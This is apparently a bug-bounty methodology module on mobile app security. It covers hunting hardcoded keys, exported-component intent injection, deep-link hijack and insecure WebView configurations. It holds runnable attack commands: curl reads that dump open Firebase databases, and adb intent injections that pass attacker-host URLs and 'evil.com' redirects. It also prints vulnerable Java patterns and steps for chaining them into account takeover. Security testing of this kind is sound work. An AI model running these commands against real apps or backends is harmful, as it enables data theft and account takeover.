# Module B — Mobile App Security (Android / iOS)

Goal: hardcoded secrets, **deep-link / exported-component hijack**, and **insecure WebView**.
Static first (JADX on the decompiled app), then dynamic (adb intent injection). iOS notes
where they differ.

Setup once:
```bash
# Android: pull the installed APK, or use the one from the program
adb shell pm path com.target.app          # -> package:/data/app/.../base.apk
adb pull /data/app/.../base.apk target.apk
jadx -d out target.apk                     # decompile to ./out (or open jadx-gui target.apk)
unzip -o target.apk -d target_unzip        # for raw assets/res/AndroidManifest
```

---

## B1. Hardcoded secrets

**The Prompt:** "What keys, tokens, or backend URLs did the devs bake into the binary,
and which of them are *live server-side* credentials rather than public client IDs?"

**The Tool:**
```bash
# Broad secret sweep across decompiled source + resources + assets
grep -rnE '(AWS|aws)_?(ACCESS|SECRET)_?KEY|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_\-]{35}|api[_-]?key|apikey|client[_-]?secret|Bearer\s+[A-Za-z0-9\-_.]+|firebaseio\.com|-----BEGIN' out/ target_unzip/res/ target_unzip/assets/
# Google/Firebase key format:  AIza...   (35 chars)
# AWS access key id:           AKIA + 16
# Also mine strings.xml and BuildConfig:
grep -rnE '(API_KEY|SECRET|TOKEN|PASSWORD|ENDPOINT)' out/ --include=BuildConfig.java --include=strings.xml
```
iOS: `strings Payload/App.app/App | grep -E 'AKIA|AIza|secret|api_key'`, and inspect
`Info.plist`, embedded `.plist`, and `Assets.car`.

**The Payload/Pattern:**
```java
// out/.../BuildConfig.java
public static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
public static final String FIREBASE_DB = "https://target-prod.firebaseio.com";
```
**Triage the finding before you report it — this is where mobile reports die:**
- A `AIza…` browser/Maps API key is usually *public by design* → likely N/A. Prove impact:
  can it call a *billable, unrestricted* API? (`curl` the Maps/Translate endpoint with it.)
- Firebase URL → immediately test open read (that's the chain, see below).
- AWS/private secret with server privileges = the real prize.

**The Bounty Mindset:** A bare key = often Informative. A key you *demonstrate calling* a
privileged backend (S3 list, Firebase read, paid API) = **P2/P1 with concrete impact**.
Never submit "found a key" — submit "found a key + here's the data it unlocks."

### B1-chain: Firebase URL → open database
```bash
curl -s 'https://target-prod.firebaseio.com/.json'          # unauth full read?
curl -s 'https://target-prod.firebaseio.com/users.json'     # PII dump = P1
```
Open Firebase read/write is one of the highest-EV mobile chains — takes one curl to escalate
a P5 string into a **P1 PII exposure**.

---

## B2. Exported components — arbitrary intent injection

**The Prompt:** "Which Activities/Services/Receivers can a *malicious app on the same device*
launch, and what do they do with the Intent's extras/data?"

**The Tool:**
```bash
# Every exported component (explicit export, or implicit via <intent-filter>)
grep -nE 'android:exported="true"|<intent-filter>' target_unzip/AndroidManifest.xml -B2 -A6
# Then read each exported component's onCreate/onStartCommand in ./out for extras use.
# Dynamic — launch it from adb as a hostile caller:
adb shell am start -n com.target.app/.SecretActivity --es token "attacker" --ez isAdmin true
adb shell am start -a android.intent.action.VIEW -d "https://internal/x" -n com.target.app/.WebActivity
adb shell am startservice -n com.target.app/.SyncService --es url "http://attacker/"
```

**The Payload/Pattern (vulnerable component reading untrusted extras):**
```java
// Exported Activity trusting caller-supplied data:
String url = getIntent().getStringExtra("url");
webView.loadUrl(url);                                   // -> load attacker URL / file:// read
// or a state change with no caller check:
if (getIntent().getBooleanExtra("skip_auth", false)) { startMainAsLoggedIn(); }
```
Look for: exported component that (a) forwards an Intent/extra to another privileged
component (**intent redirection**), (b) loads a URL/file into a WebView, or (c) flips an
auth/role flag. `PendingIntent` created with a mutable, empty base intent is the redirection
tell.

**The Bounty Mindset:** Exported-component abuse = **local privilege/auth bypass or data
theft by any installed app**, no root needed. Reproducible with one `adb am` line, which
triagers can rerun — high survival. Intent redirection into an internal WebView that then
reads `file://` is a classic **P2 → P1** local-to-sensitive-data chain.

---

## B3. Deep-link / App-link hijack

**The Prompt:** "What custom scheme or verified https link does the app claim, is the claim
weak (custom scheme any app can register, or unverified autoVerify), and does the handler
trust link parameters?"

**The Tool:**
```bash
grep -nE 'android:scheme|android:host|autoVerify|<data ' target_unzip/AndroidManifest.xml
# Is the App Links claim actually verified?  (custom scheme = hijackable; https w/o AAL = weak)
curl -s https://target.com/.well-known/assetlinks.json | head
# Fire a deep link:
adb shell am start -a android.intent.action.VIEW -d "targetapp://reset?token=ATTACKER&next=//evil.com"
```
iOS: read `Info.plist` `CFBundleURLSchemes` (custom, hijackable) vs
`apple-app-site-association` (Universal Links, stronger). Check
`https://target.com/.well-known/apple-app-site-association`.

**The Payload/Pattern:**
```java
Uri data = getIntent().getData();
String next = data.getQueryParameter("next");
webView.loadUrl(next);                       // open redirect / js: into app WebView
String token = data.getQueryParameter("token"); // token accepted from a link any app can send
```
Two payoffs: (1) **custom scheme** is registerable by a malicious app → it intercepts
OAuth/reset tokens delivered via the link (**account takeover**); (2) a `next=`/`url=` param
loaded into the WebView → open redirect / WebView XSS.

**The Bounty Mindset:** Deep-link token theft = **account takeover, P1**. Even
open-redirect-via-deeplink is a solid P3 that *chains* into OAuth token leak. Programs pay
because the victim only has to click one link.

---

## B4. Insecure WebView

**The Prompt:** "Does a WebView enable JavaScript + a JS bridge + file access, and can I
reach it with a URL I control (via B2/B3)?"

**The Tool:**
```bash
grep -rnE 'setJavaScriptEnabled\(true\)|addJavascriptInterface|setAllowFileAccess(FromFileURLs)?\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|loadUrl\(|shouldOverrideUrlLoading|WebViewClient' out/
```

**The Payload/Pattern (the toxic combination):**
```java
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);   // file:// can read anything
webView.addJavascriptInterface(new NativeBridge(), "Android");     // JS -> native
webView.loadUrl(getIntent().getStringExtra("url"));               // attacker-controlled URL
```
`addJavascriptInterface` + attacker-controlled content = **JS reaches native methods**
(read files, call app APIs). `setAllowUniversalAccessFromFileURLs(true)` + a `file://`
payload delivered via B2/B3 = **local file exfiltration**. Missing `onReceivedSslError`
handling (calling `.proceed()`) = MITM.

**The Bounty Mindset:** WebView + JS bridge reachable from an exported component/deeplink is
the canonical **local RCE-lite / arbitrary file read = P1** mobile chain. It is the single
most-paid mobile source finding because the impact (native method access) is unambiguous.

> House rule: mobile secrets and single components are the classic "Informative" bin. Every
> Module B report must show the *chain to data or takeover*, not just the misconfig. Name the
> attacker (a malicious app? a phishing link?) before writing it up.
